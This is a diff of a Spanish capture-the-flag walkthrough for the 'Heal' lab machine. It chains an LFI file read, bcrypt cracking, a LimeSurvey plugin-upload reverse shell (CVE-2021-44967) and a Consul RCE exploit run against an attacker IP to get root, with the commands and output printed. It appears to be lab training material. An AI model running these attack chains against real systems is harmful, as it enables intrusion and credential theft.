@@ -1,7 +1,7 @@
 ---
+icon: desktop
 hidden: true
 noIndex: true
-icon: desktop
 layout:
   title:
     visible: true
@@ -19,6 +19,14 @@ layout:
 
 
 
+<figure><img src="../../.gitbook/assets/Heal (1).png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Heal`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
+
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.46 -oG allPorts
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 21:52 CET
@@ -32,7 +40,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -45,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Nginx` y el servicio SSH.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.46 -A -oN targeted -oX targetedXML
@@ -78,7 +86,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 38.11 seconds
 ```
 
-
+Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -87,49 +95,51 @@ Nmap done: 1 IP address (1 host up) scanned in 38.11 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (235).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos en nuestro archivo `/etc/hosts` la entrada correspondiente que nos muestra **Nmap** que nos redirigrá el sitio web al acceder.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.46
 10.10.11.46 heal.htb
 ```
 
+## Web Enumeration
 
+Accederemos a [http://heal.htb](http://heal.htb) y verificaremos que existe un panel de inicio de sesión en el cual podemos crear un resumen profesesional en cuestión de minutos. Probaremos de registrarnos en el sitio web.
 
-<figure><img src="../../.gitbook/assets/4057_vmware_JH3lPaRnS6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/4057_vmware_JH3lPaRnS6.png" alt="" width="563"><figcaption></figcaption></figure>
 
+Nos registraremos con nuestro usuario `gzzcoo`.
 
+<figure><img src="../../.gitbook/assets/imagen (236).png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (236).png" alt=""><figcaption></figcaption></figure>
-
-
+Logramos acceder con nuestro usuario recién creado, entra las opciones que se nos muestran, ingresaremos a ellas para verificar que más opciones nos ofrece el sitio web. En este caso probaremos de acceder a `Survey`.
 
 <figure><img src="../../.gitbook/assets/imagen (237).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisamos que nos lleva a [http://heal.htb/survey](http://heal.htb/survey), parece ser una página en la cual dándole a `Take the Survey` nos redirige a una página de un subdominio `take-survey.heal.htb` para realizar un cuestionario.
 
 <figure><img src="../../.gitbook/assets/imagen (238).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos este nuevo subdomino ennuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.46
-10.10.11.46 heal.htb take-survey.heal.htb api.heal.htb
+10.10.11.46 heal.htb take-survey.heal.htb
 ```
 
-
+Al acceder a la opción que nos daba el botón, nos encontramos con la siguiente página, la cual investigando no hay ningún tipo de información, simplemente un cuestionario a rellenar.
 
 <figure><img src="../../.gitbook/assets/imagen (239).png" alt=""><figcaption></figcaption></figure>
 
-
+Probaremos de acceder directamente a http://take-survey.heal.htb y verificamos que hemos logrado encontrar más información. Se nos indica que el usuario `Administrator` del sitio web es `ralph@heal.htb`.
 
 <figure><img src="../../.gitbook/assets/imagen (240).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos un escaneo de directorios y archivos sobre la página [http://take-survey.heal.htb/index.php/](http://take-survey.heal.htb/index.php/) y nos encontramos con el siguiente resultado.
 
 ```bash
 ❯ dirsearch -u "http://take-survey.heal.htb/index.php/" -t 30 -i 200
@@ -148,11 +158,11 @@ Target: http://take-survey.heal.htb/
 [22:36:40] 200 -   75KB - /index.php/bitrix/admin/index.php
 ```
 
-admin/
+Al probar de acceder al directorio `/admin`, nos encontramos con un panel de Administración que nos pide credenciales de acceso.
 
-<figure><img src="../../.gitbook/assets/imagen (246).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (246).png" alt="" width="563"><figcaption></figcaption></figure>
 
-
+Realizaremos un escaneo de subdominios de la página web, nos encontramos que todos los resultados nos devuelven **178 carácteres**.
 
 ```bash
 ❯ wfuzz -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.heal.htb" http://heal.htb 2>/dev/null
@@ -172,7 +182,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000031:   301        7 L      12 W       178 Ch      "archives"   
 ```
 
-
+Volveremos a realizar el escanao, descartando el resultado anterior. Después de un tiempo, logramos encontrar un subdominio llamado `api`.
 
 ```bash
 ❯ wfuzz -c --hh=178 --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.heal.htb" http://heal.htb 2>/dev/null
@@ -190,47 +200,64 @@ ID           Response   Lines    Word       Chars       Payload
 000001013:   200        90 L     186 W      12515 Ch    "api"   
 ```
 
+Añadiremos este nuevo subdominio en nuestro archivo `/etc/hosts`.
 
+```bash
+❯ cat /etc/hosts | grep 10.10.11.46
+10.10.11.46 heal.htb take-survey.heal.htb api.heal.htb
+```
 
-
+Al acceder a http://api.heal.htb, se nos muestra la siguiente página web en la cual se nos indica que la página web utiliza `Rails 7.1.4`. Veremos si más adelante esta información es útil o no.
 
 <figure><img src="../../.gitbook/assets/imagen (241).png" alt="" width="563"><figcaption></figcaption></figure>
 
+## Initial Foothold
 
+### Local File Inclusion (LFI) on Website parameter
 
-
+Volveremos a la página de http://heal.htb/resume, en la cual nos permitía rellenar nuestro perfil profesional. Verificamos que nos proporcionan un botón de `Export as PDF`. Interceptaremos la solicitud con `BurpSuite` para verificar como es esta solicitud que se envía al servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (242).png" alt=""><figcaption></figcaption></figure>
 
+Una vez tengamos la solicitud interceptada, realizaremos varias veces el redireccionamiento de la solicitud `Forward`, nos encontramos con la siguiente soliticud, la cual hace una petición por método `GET` sobre un directorio llamado `/downloads` y a través de una variable `filename` llama al archivo PDF que hemos generado.
 
-
-
+Enviaremos esta solicitud al modo de `Repeater`.
 
 <figure><img src="../../.gitbook/assets/4068_vmware_KgrNjCDLxN.png" alt=""><figcaption></figcaption></figure>
 
+Modificaremos la solicitud que se envía al servidor, trataremos de listar el contenido del archivo `/etc/passwd` a través de un **Local File Inclusion (LFI)**.
 
+Verificamos que el sitio web es vulnerable a **LFI** y hemos podido listar el contenido del `/etc/passwd` correctamente.
 
 <figure><img src="../../.gitbook/assets/imagen (245).png" alt=""><figcaption></figcaption></figure>
 
+Revisando el contenido del `/etc/passwd`, comprobamos que existen solamente dos usuarios sin privilegios que dispoonen de una `bash`.
+
 <figure><img src="../../.gitbook/assets/imagen (247).png" alt=""><figcaption></figcaption></figure>
 
+Si bien recordamos, nos encontramos en la página de [http://api.heal.htb](http://api.heal.htb) que la página web utilizaba `Rails 7.1.4`.
 
+Por lo tanto, podemos pensar si podemos listar algún archivo de configuración de `Rails` para intentar encontrar información, configuraciones, credenciales, etc.
+
+Nos encontramos con el siguiente blog en el cual nos explican donde se almacenan estos archivos.
 
 {% embed url="https://guides.rubyonrails.org/configuring.html" %}
 
 <figure><img src="../../.gitbook/assets/imagen (248).png" alt="" width="563"><figcaption></figcaption></figure>
 
-
-
-
+Probaremos de listar el contenido del archivo `/config/database.yml` y en el resultado por parte del servidor, logramos visualizar el contenido del archivo. En este archivo se nos indica donde se almacena la base de datos de `Rails`.
 
 <figure><img src="../../.gitbook/assets/imagen (249).png" alt=""><figcaption></figcaption></figure>
 
+Trataremos de visualizar el contenido del archivo de la base de datos que utiliza la aplicación. En este caso, logramos visualizar el contenido en el cual se nos muestra al usuario `ralph` y su contraseña hasheada.
 
+Recordemos que el usuario `ralph@heal.htb` es el usuario Administrator del sitio web.
 
 <figure><img src="../../.gitbook/assets/4074_vmware_9CIzM0HpdY.png" alt=""><figcaption></figcaption></figure>
 
+### Cracking Hashes
 
+Verificarems el tipo de hash del cual se trata y a través de `hashcat` probaremos de crackear el hash. Comprobamos que logramos visualizar la contraseña en texto plano.
 
 ```bash
 ❯ hashid '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
@@ -247,27 +274,39 @@ hashcat (v6.2.6) starting
 $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
 ```
 
+### Accessing on LimeSurvey Administration Panel
 
-
-[http://take-survey.heal.htb/index.php/admin/authentication/sa/login](http://take-survey.heal.htb/index.php/admin/authentication/sa/login) aaa
-
-
+Volveremos al panel de Administración de LimeSurvey a través de [http://take-survey.heal.htb/index.php/admin/authentication/sa/login](http://take-survey.heal.htb/index.php/admin/authentication/sa/login) y probaremos de acceder con el usuario `ralph`y sus credenciales encontradas.
 
 <figure><img src="../../.gitbook/assets/4075_vmware_weSrLPAA1x.png" alt="" width="563"><figcaption></figcaption></figure>
 
+Verificamos que hemos logrado obtener el acceso correctamente a `LimeSurvey`.
 
+{% hint style="info" %}
+LimeSurvey (anteriormente PHPSurveyor) es una aplicación de software libre para la realización de encuestas en línea1​, escrita en PHP y que utiliza bases de datos MySQL, PostgreSQL o MSSQL. Esta utilidad brinda la posibilidad a usuarios sin conocimientos de programación el desarrollo, publicación y recolección de respuestas de sus encuestas.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (250).png" alt=""><figcaption></figcaption></figure>
 
+### LimeSurvey Exploitation Remote Code Execution \[RCE] - (CVE-2021-44967)
 
+Realizando una enumeración de la página web, nos encontramos que se trata de `LimeSurvey Community Edition Version 6.6.4`, lo cual podremos intentar buscar alguna vulnerabilidad conocida.
 
 <figure><img src="../../.gitbook/assets/imagen (251).png" alt=""><figcaption></figcaption></figure>
 
+Realizando una búsqueda por Internet, nos encontramos con el siguiente `CVE-2021-44967`.
 
+{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2021-44967" %}
 
-{% embed url="https://nasirli.medium.com/limesurvey-6-6-4-rce-0a54c2c09c5e" %}
+{% hint style="danger" %}
+Existe una vulnerabilidad de ejecución remota de código (RCE) en LimeSurvey 5.2.4 a través de la función de carga e instalación de complementos, que podría permitir que un usuario malintencionado remoto cargue un archivo de código PHP arbitrario.
+{% endhint %}
 
+Por otro lado, nos encontramos con el siguiente repositorio para expotar esta vulnerabilidad.
 
+{% embed url="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE" %}
+
+Nos descargaremos el repositorio de GitHube del exploit.
 
 ```bash
 ❯ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE; cd Limesurvey-RCE
@@ -280,11 +319,7 @@ Recibiendo objetos: 100% (24/24), 10.00 KiB | 10.00 MiB/s, listo.
 Resolviendo deltas: 100% (5/5), listo.
 ```
 
-
-
-añadir 6
-
-
+Editaremos el archivo `config.xml` para especificar la versión `6.0`, sino, no podremos explotar esta vulnerabilidad.
 
 ```bash
 ❯ cat config.xml
@@ -314,11 +349,11 @@ añadir 6
 </config>
 ```
 
-
+Editaremos el archivo `php-rev.php` y estableceremos nuestra dirección IP de atacante y el puerto desde donde estaremos en escucha.
 
 <figure><img src="../../.gitbook/assets/4079_vmware_aqNmBBlOZx.png" alt=""><figcaption></figcaption></figure>
 
-
+Comrpimiremos estos nuevos archivos en un archivo llamado por ejemplo, `Gzzcoo.zip`.
 
 ```bash
 ❯ zip Gzzcoo.zip config.xml php-rev.php
@@ -328,40 +363,40 @@ añadir 6
 .rw-rw-r-- kali kali 1.6 KB Fri Jan 24 22:57:27 2025  Gzzcoo.zip
 ```
 
-
+Desde el panel de `LimeSurvey`, accederemos al apartado de `Configuration < Plugins`.
 
 <figure><img src="../../.gitbook/assets/imagen (252).png" alt=""><figcaption></figcaption></figure>
 
-
+Dentro de la sección de Plugins, ingresaremos a la opción de `Upload & install`.
 
 <figure><img src="../../.gitbook/assets/imagen (253).png" alt=""><figcaption></figcaption></figure>
 
+Subiremos nuestro archivo `Gzzcoo.zip` para importarlo en el sitio web.
 
+<figure><img src="../../.gitbook/assets/imagen (254).png" alt="" width="368"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (254).png" alt=""><figcaption></figcaption></figure>
-
-
+Instalaremos el nuevo plugin en `LimeSurvey`.
 
 <figure><img src="../../.gitbook/assets/imagen (255).png" alt=""><figcaption></figcaption></figure>
 
-
+Por otro lado, nos pondremos en escucha por el puerto especificado.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+En el panel de Plugins, deberemos de activar el plugin subido.
 
 <figure><img src="../../.gitbook/assets/4084_vmware_lDjYkjkMJD.png" alt=""><figcaption></figcaption></figure>
 
-
+Confirmaremos la activación del plugin recién subido.
 
 <figure><img src="../../.gitbook/assets/imagen (256).png" alt=""><figcaption></figcaption></figure>
 
-accedemos a [http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php](http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php)
+Accederemos a [http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php](http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php) y volviendo a la terminal donde estábamos en escucha, verificamos que logramos acceder al equipo correctamente.
 
-
+Nos encontramos como usuario `www-data`, el cual normalmente no dispone de ningún privilegio.
 
 ```bash
 ❯ nc -nlvp 443
@@ -379,7 +414,11 @@ Script started, output log file is '/dev/null'.
 www-data@heal:/$
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Revisando los diferentes directorios, nos encontramos en el archivo `index.php` que especifican que el archivo de configuración se encuentra en `application/config/config.php`.
 
 ```bash
 www-data@heal:~/limesurvey/admin$ ls -l
@@ -420,7 +459,7 @@ if ($urlStyle == 'path') {
 }
 ```
 
-
+Listaremos el contenido del archivo, y verificamos que aparecen credenciales de acceso a una base de datos de PostgreSQL.
 
 ```bash
 www-data@heal:~/limesurvey/application/config$ cat config.php
@@ -440,7 +479,9 @@ return array(
 		),
 ```
 
+Después de varios intentos intentando acceder al PostgreSQL, probamos de verificar si estas credenciales se reutilizaban para uno de los usuarios que disponían de una `bash`.
 
+Verificamos que hemos podido acceder como usuario `ron` y obtener la flag **user.txt**.
 
 ```bash
 www-data@heal:/$ cat /etc/passwd | grep bash
@@ -457,7 +498,11 @@ ron@heal:/$ cat /home/ron/user.txt
 5a4c50cd03979eab6aa0c197792d4ec3
 ```
 
+## Privilege Escalation
 
+### Checking Internal Ports
+
+Revisarmeos los puertos internos que se encuentran abiertos en el equipo, vemos un listado de puertos inusuales.
 
 ```bash
 ron@heal:~$ netstat -ano
@@ -477,7 +522,9 @@ tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      off (0.00/0/0)
 ```
 
+### SSH Port Forwarding
 
+Probaremos de realizar **SSH Port Forwarding** sobre todos los puertos internos encontrados hacía nuestro equipo local de atacante, para verificar que hay detás de ellos.
 
 ```bash
 ❯ ssh  -L 5423:127.0.0.1:5432 -L 8300:127.0.0.1:8300 -L 8301:127.0.0.1:8301 -L 8302:127.0.0.1:8302 -L 8500:127.0.0.1:8500 -L 8503:127.0.0.1:8503 -L 8600:127.0.0.1:8600 -L 3000:127.0.0.1:300 -L 3001:127.0.0.1:3001 ron@10.10.11.46
@@ -487,7 +534,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
 ron@heal:~$
 ```
 
-
+Verificaremos que todos los puertos se encuentran abiertos en nuestro equipo lccal.
 
 ```bash
 ❯ nmap -p- localhost
@@ -512,20 +559,28 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
 ```
 
+Probando de acceder a http://127.0.0.1:8500, logramos acceder a un sitio web de `Hashicorp Consul`.
 
+{% hint style="info" %}
+HashiCorp Consul es una solución de redes de servicios que permite a los equipos gestionar la conectividad de red segura entre servicios y entre entornos locales y multicloud y tiempos de ejecución. Consul ofrece detección de servicios, malla de servicios, gestión de tráfico y actualizaciones automáticas para dispositivos de infraestructura de red. Puede utilizar estas funciones de forma individual o en conjunto en una única implementación de Consul.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (259).png" alt=""><figcaption></figcaption></figure>
 
+### Hashicorp Consul v1.0 - Remote Code Execution (RCE)
 
+Buscando vulnerabilidades sobre la aplicación, nos encontramos con el siguiente exploit para obtener un RCE.
 
 {% embed url="https://www.exploit-db.com/exploits/51117" %}
+
+Nos ponemos en escucha por un puerto para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutamos el exploit sobre nuestro localhost en el puerto 8500 (debido que hemos realizado anteriormente el Port Forwarding) y especificamos nuestra dirección IP y el puerto donde vamos a estar en escucha.
 
 ```bash
 ❯ python3 exploit.py 127.0.0.1 8500 10.10.16.5 443 0
@@ -533,7 +588,7 @@ listening on [any] 443 ...
 [+] Request sent successfully, check your listener
 ```
 
-
+Volviendo a la terminal, nos encontramos que hemos logrado obtener acceso y en este caso somos el usuario `root`. Verificamos la flag de **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -543,5 +598,5 @@ bash: cannot set terminal process group (12578): Inappropriate ioctl for device
 bash: no job control in this shell
 root@heal:/# cat /root/root.txt
 cat /root/root.txt
-5bcfe05b5dd4d8941591a269e459bda9
+5bcfe05b5dd*********************
 ```
